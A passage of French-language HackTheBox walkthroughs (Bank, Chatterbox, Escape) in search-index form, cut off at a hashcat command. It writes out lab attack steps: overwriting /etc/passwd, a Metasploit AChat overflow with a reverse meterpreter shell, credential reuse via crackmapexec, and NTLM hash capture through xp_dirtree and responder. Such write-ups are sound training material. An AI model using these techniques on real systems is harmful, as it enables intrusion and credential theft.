2.10.2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.129.29.200\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.2\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       14l       74w     6216c http://10.129.29.200/icons/ubuntu-logo.png\n200      GET      378l      980w    11510c http://10.129.29.200/\n404      GET        9l       33w      290c http://10.129.29.200/Web%20References\n404      GET        9l       33w      285c http://10.129.29.200/Home%20Page\n404      GET        9l       33w      290c http://10.129.29.200/Press%20Releases\n404      GET        9l       33w      284c http://10.129.29.200/Site%20Map\n404      GET        9l       34w      292c http://10.129.29.200/Life%20Income%20Gift\n404      GET        9l       33w      286c http://10.129.29.200/New%20Folder\n404      GET        9l       33w      287c http://10.129.29.200/Site%20Assets\n[####################] - 2m     30005/30005   0s      found:9       errors:0      \n[####################] - 2m     30000/30000   306/s   http://10.129.29.200/\n</code></pre> <pre><code>pak@laptop:~/T\u00e9l\u00e9chargements$ dig axfr bank.htb @10.129.29.200 \n\n; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr bank.htb @10.129.29.200\n;; global options: +cmd\nbank.htb.       604800  IN  SOA bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\nbank.htb.       604800  IN  NS  ns.bank.htb.\nbank.htb.       604800  IN  A   10.129.29.200\nns.bank.htb.        604800  IN  A   10.129.29.200\nwww.bank.htb.       604800  IN  CNAME   bank.htb.\nbank.htb.       604800  IN  SOA bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\n;; Query time: 319 msec\n;; SERVER: 10.129.29.200#53(10.129.29.200) (TCP)\n;; WHEN: Tue Apr 02 13:23:23 CEST 2024\n;; XFR size: 6 records (messages 1, bytes 171)\n</code></pre> <p>Apr\u00e8s un fuzzing des r\u00e9pertoire, on trouve :</p> <pre><code>http://bank.htb/balance-transfer/?C=S;O=A\n</code></pre> <p>Dont le fichier :</p> <pre><code>http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc\n\n--ERR ENCRYPT FAILED\n+=================+\n| HTB Bank Report |\n+=================+\n\n===UserAccount===\nFull Name: Christos Christopoulos\nEmail: chris@bank.htb\nPassword: !##HTBB4nkP4ssw0rd!##\nCreditCards: 5\nTransactions: 39\nBalance: 8842803 .\n===UserAccount===\n</code></pre>"},{"location":"Writeup/HTB/Machines/Bank/#foothold","title":"Foothold","text":"<p>Sur la page de support il est possible d'uploader un fichier, et nous voyons ce message dans le code source :</p> <p></p> <p></p>"},{"location":"Writeup/HTB/Machines/Bank/#privesc","title":"Privesc","text":"<p>Apr\u00e8s un linpeas, on se rend compte que nous pouvons \u00e9crire sur /etc/passwd... La box est donc termin\u00e9e :</p> <pre><code>pak@Desktop:~/Downloads$ openssl passwd pakpak123\n$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70\n</code></pre> <pre><code>root:$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmessagebus:x:102:106::/var/run/dbus:/bin/false\nlandscape:x:103:109::/var/lib/landscape:/bin/false\nchris:x:1000:1000:chris,,,:/home/chris:/bin/bash\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nbind:x:105:112::/var/cache/bind:/bin/false\nmysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <pre><code>(remote) www-data@bank:/tmp$ su\nPassword: \nroot@bank:/tmp# cd /root\nroot@bank:~# ls\nroot.txt\n</code></pre>"},{"location":"Writeup/HTB/Machines/Chatterbox/","title":"Chatterbox","text":"Room Chatterbox Url https://app.hackthebox.com/machines/123 Sujets Windows Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Chatterbox/#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE     REASON  VERSION\n135/tcp   open  msrpc       syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn syn-ack Microsoft Windows netbios-ssn\n445/tcp   open  \ufffd\ufffd\ufffdd5V      syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n9255/tcp  open  http        syn-ack AChat chat system httpd\n|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE\n|_http-server-header: AChat\n|_http-title: Site doesn't have a title.\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n9256/tcp  open  achat       syn-ack AChat chat system\n49152/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49153/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49154/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49155/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49156/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49157/tcp open  msrpc       syn-ack Microsoft Windows RPC\nService Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 60790/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 64306/udp): CLEAN (Timeout)\n|   Check 4 (port 9559/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: Chatterbox\n|   NetBIOS computer name: CHATTERBOX\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2023-09-07T19:49:09-04:00\n| smb2-time: \n|   date: 2023-09-07T23:49:06\n|_  start_date: 2023-09-07T23:45:56\n|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n</code></pre>"},{"location":"Writeup/HTB/Machines/Chatterbox/#exploit","title":"Exploit","text":"<p>On voit un service \"AChat\" (inconnu au bataillon): \u00e7a a l'air de r\u00e9pondre \u00e0 du http, je tente d'aller dessus avec mon brave firefox mais... rien.</p> <p>Un searchsploit sur AChat montre un buffer overflow possible sur une des versions. Pourquoi pas ! Un module metasploit semble exister, mais il n'est pas tr\u00e8s coop\u00e9ratif \u00e0 premi\u00e8re vue:</p> <pre><code>[-] Exploit failed: windows/meterpreter/reverse_tcp: All encoders failed to encode.\n[*] Exploit completed, but no session was created.\n</code></pre> <p>Une petite recherche me permet de voir que le souci n'apparait plus en changeant le type de payload:</p> <pre><code>set payload windows/meterpreter/reverse_tcp_allports\n</code></pre> <p>Et effectivement j'obtiens bien une connexion mais... elle meurt quelques secondes apr\u00e8s. Tristesse.</p> <pre><code>msf6 exploit(windows/misc/achat_bof) &gt; exploit\n\n[*] Started reverse TCP handler on 10.10.16.13:1 \n[*] Sending stage (175686 bytes) to 10.10.10.74\n[*] Meterpreter session 2 opened (10.10.16.13:1 -&gt; 10.10.10.74:49159) at 2023-09-07 21:04:15 +0200\n\nmeterpreter &gt; shell\nProcess 2488 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;\n[*] 10.10.10.74 - Meterpreter session 2 closed.  Reason: Died\n</code></pre> <p>Je re-tente l'exploit, juste le temps de lancer une commande \"ps\":</p> <pre><code>meterpreter &gt; ps\n\nProcess List\n============\n\n PID   PPID  Name            Arch  Session  User               Path\n ---   ----  ----            ----  -------  ----               ----\n 0     0     [System Proces\n             s]\n 4     0     System\n 212   3860  CompatTelRunne\n             r.exe\n 232   4     smss.exe\n 288   576   rundll32.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\rundll32.ex\n                                                               e\n 312   304   csrss.exe\n 352   304   wininit.exe\n 364   344   csrss.exe\n 420   344   winlogon.exe\n 456   352   services.exe\n 464   352   lsass.exe\n 472   352   lsm.exe\n 576   456   svchost.exe\n 592   920   wuauclt.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\wuauclt.exe\n 640   456   vm3dservice.ex\n             e\n 664   456   svchost.exe\n 716   456   svchost.exe\n 792   456   svchost.exe\n 872   456   svchost.exe\n 920   456   svchost.exe\n 968   456   svchost.exe\n 984   456   svchost.exe\n 1076  288   dinotify.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\System32\\dinotify.ex\n                                                               e\n 1104  456   svchost.exe\n 1236  456   spoolsv.exe\n 1272  456   svchost.exe\n 1400  456   taskhost.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\taskhost.ex\n                                                               e\n 1424  456   svchost.exe\n 1504  456   sppsvc.exe\n 1548  792   dwm.exe         x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\Dwm.exe\n 1572  1504  explorer.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\Explorer.EXE\n 1696  1572  vm3dservice.ex  x86   1        CHATTERBOX\\Alfred  C:\\Windows\\System32\\vm3dservice\n             e                                                 .exe\n 1704  1572  vmtoolsd.exe    x86   1        CHATTERBOX\\Alfred  C:\\Program Files\\VMware\\VMware\n                                                               Tools\\vmtoolsd.exe\n 1824  456   VGAuthService.\n             exe\n 1852  456   vmtoolsd.exe\n 1872  312   conhost.exe\n 2100  456   dllhost.exe\n 2160  576   WmiPrvSE.exe\n 2344  456   msdtc.exe\n 2540  456   SearchIndexer.\n             exe\n 2752  3052  AChat.exe       x86   1        CHATTERBOX\\Alfred  c:\\Program Files\\AChat\\AChat.ex\n                                                               e\n 3164  456   svchost.exe\n 3188  920   taskeng.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\taskeng.exe\n 3316  576   WmiPrvSE.exe\n 3836  576   dllhost.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\DllHost.exe\n 3860  456   CompatTelRunne\n             r.exe\n</code></pre> <p>Impeccable. Je vois par exemple le PID 288, je tente donc de relancer l'exploit et de migrer tr\u00e8s vite vers ce PID pour voir si mon shell se stabilise:</p> <pre><code>meterpreter &gt; migrate 288\n[*] Migrating from 3816 to 288...\n[*] Migration completed successfully.\nmeterpreter &gt; \n</code></pre> <p>Ca fonctionne, mon shell semble \u00eatre stable. </p> <pre><code>C:\\Windows\\system32&gt;whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name         SID                                          \n================= =============================================\nchatterbox\\alfred S-1-5-21-1218242403-4263168573-589647361-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes                                        \n====================================== ================ ============ ==================================================\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State   \n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled \nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n</code></pre> <p>Un d\u00e9placement sur le desktop de l'utilisateur: le flag est l\u00e0, comme attendu.</p>"},{"location":"Writeup/HTB/Machines/Chatterbox/#devenons-root","title":"Devenons root","text":"<p>Et l\u00e0... J'ai pas trop d'id\u00e9es. Je fais un peu le tour du syst\u00e8me, je ne vois pas grand chose. Un petit WinPEAS ? Aller.</p> <p>Bingo.</p> <pre><code>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0379 Looking for AutoLogon credentials\n    Some AutoLogon credentials were found\n    DefaultUserName               :  Alfred\n    DefaultPassword               :  Welcome1!\n</code></pre> <p>Bon, c'est mon utilisateur actuel, certe, mais \u00e7a risque de me permettre de tenter quelques trucs sur le SMB qui semble ouvert.</p> <pre><code>\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Alfred -p 'Welcome1!'       \nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Alfred:Welcome1! \n\n\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\n</code></pre> <p>AH ! D'accord. Bah je n'y croyais pas forc\u00e9ment, mais il s'agit de password-reuse. Je suis root.</p> <pre><code>\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'dir C:\\Users\\Administrator\\Desktop'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Executed command \nSMB         10.10.10.74     445    CHATTERBOX       Volume in drive C has no label.\nSMB         10.10.10.74     445    CHATTERBOX       Volume Serial Number is 502F-F304\nSMB         10.10.10.74     445    CHATTERBOX       \nSMB         10.10.10.74     445    CHATTERBOX       Directory of C:\\Users\\Administrator\\Desktop\nSMB         10.10.10.74     445    CHATTERBOX       \nSMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          .\nSMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          ..\nSMB         10.10.10.74     445    CHATTERBOX       09/07/2023  08:25 PM                34 root.txt\nSMB         10.10.10.74     445    CHATTERBOX       1 File(s)             34 bytes\nSMB         10.10.10.74     445    CHATTERBOX       2 Dir(s)   3,311,423,488 bytes free\n\n\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Executed command \nSMB         10.10.10.74     445    CHATTERBOX       ce4b046919fe296c########8be1\n</code></pre> <p>:).</p>"},{"location":"Writeup/HTB/Machines/Escape/","title":"Escape","text":"Room Escape Url https://app.hackthebox.com/machines/531 Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Escape/#nmap","title":"Nmap","text":"<pre><code>pak@kali:~$ nmap -A -p- 10.129.81.126 -Pn  \nStarting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 14:12 CEST\nNmap scan report for 10.129.81.126\nHost is up (0.013s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 20:14:07Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.129.81.126:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-10-14T20:11:04\n|_Not valid after:  2053-10-14T20:11:04\n| ms-sql-ntlm-info: \n|   10.129.81.126:1433: \n|     Target_Name: sequel\n|     NetBIOS_Domain_Name: sequel\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: dc.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49697/tcp open  msrpc         Microsoft Windows RPC\n49702/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2023-10-14T20:14:57\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s\n</code></pre> <p>Nous voyons le nom du domaine, sequel.htb, ainsi que tout les services usuels d'un DC. Pas de web, pas de services particuliers permettant de se frayer un acc\u00e8s ou d'avoir des infos... Mais un MSSQL est tout de m\u00eame pr\u00e9sent, j'imagine que le foothold se fera par l\u00e0.</p> <p>On aper\u00e7oit aussi l'utilisation de certificat, \u00e0 voir si ce sera \u00e0 exploiter quelque-part, je me suis beaucoup renseign\u00e9 sur le sujet mais je ne l'ai jamais r\u00e9ellement fait, \u00e7a peut \u00eatre int\u00e9ressant !</p> <p>Je commence par tenter un enum4linux classique, mais je n'obtiens pas de r\u00e9sultats particulier. Je passe donc sur smbclient pour voir si des partages sont accessibles :</p> <pre><code>pak@kali:~$ smbclient -L \\\\sequel.htb\nPassword for [WORKGROUP\\pak]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share\n</code></pre> <p>On voit un dossier \"Public\", donc je tente ma chance, mais sans trop y croire:</p> <pre><code>pak@kali:~$ smbclient //sequel.htb/Public\nPassword for [WORKGROUP\\pak]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Nov 19 12:51:25 2022\n  ..                                  D        0  Sat Nov 19 12:51:25 2022\n  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022\n\n                5184255 blocks of size 4096. 1444011 blocks available\nsmb: \\&gt;\n</code></pre> <p>On le r\u00e9cup\u00e8re :</p> <pre><code>smb: \\&gt; get \"SQL Server Procedures.pdf\"\ngetting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (254.7 KiloBytes/sec) (average 254.7 KiloBytes/sec)\n</code></pre> <p></p> <p>Ok ! Je me pr\u00e9pare une petite wordlist d'utilisateur avec les noms pr\u00e9sents dans le document, \u00e7a peut servir. On voit aussi des creds pour l'acc\u00e8s au mssql, ils ne doivent pas avoir \u00e9norm\u00e9ment de droits mais bon, on a quelque-chose :).</p>"},{"location":"Writeup/HTB/Machines/Escape/#exploitation","title":"Exploitation","text":"<p>On tente de se connecter \u00e0 mssql:</p> <pre><code>pak@kali:~$ impacket-mssqlclient PublicUser@sequel.htb\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (PublicUser  guest@master)&gt;\n</code></pre> <p>On est connect\u00e9s o/ ! Mais on n'a acc\u00e8s \u00e0 pas grand chose. Un MsSQL vide, rien que du tr\u00e8s classique. </p> <pre><code>SQL (PublicUser  guest@master)&gt; enum_db\nname     is_trustworthy_on   \n------   -----------------   \nmaster                   0   \n\ntempdb                   0   \n\nmodel                    0   \n\nmsdb                     1 \n\n\n\nSQL (PublicUser  guest@master)&gt; enum_users\nUserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   \n------------------   --------   ---------   ---------   -------------   ----------   -----   \ndbo                  db_owner   sa          master      dbo             b'1         '   b'01'   \n\nguest                public     NULL        NULL        guest           b'2         '   b'00'   \n\nINFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   \n\nsys                  public     NULL        NULL        NULL            b'4         '    NULL \n\n\n\nSQL (PublicUser  guest@master)&gt; enum_impersonate\nexecute as   database   permission_name   state_desc   grantee   grantor   \n----------   --------   ---------------   ----------   -------   -------  \n\n\nSQL (PublicUser  guest@msdb)&gt; enable_xp_cmdshell\n[-] ERROR(DC\\SQLMOCK): Line 105: User does not have permission to perform this action.\n[-] ERROR(DC\\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.\n[-] ERROR(DC\\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.\n[-] ERROR(DC\\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.\n</code></pre> <p>Par contre, xp_dirtree donctionne, on va donc lancer l'ami responder :).</p> <pre><code>SQL (PublicUser  guest@msdb)&gt; xp_dirtree \\\\10.10.16.35\\truc\nsubdirectory   depth   file   \n------------   -----   ----   \n</code></pre> <p>La r\u00e9ponse ne se fait pas attendre :</p> <pre><code>SMB] NTLMv2-SSP Client   : 10.129.81.126\n[SMB] NTLMv2-SSP Username : sequel\\sql_svc\n[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000\n</code></pre> <p>Okay, on a maintenant un user sql_svc et son hash ! Ne reste plus qu'\u00e0 prier pour qu'on puisse le cracker sans trop de probl\u00e8me :).</p> <pre><code>pak@kali:~$ hashcat 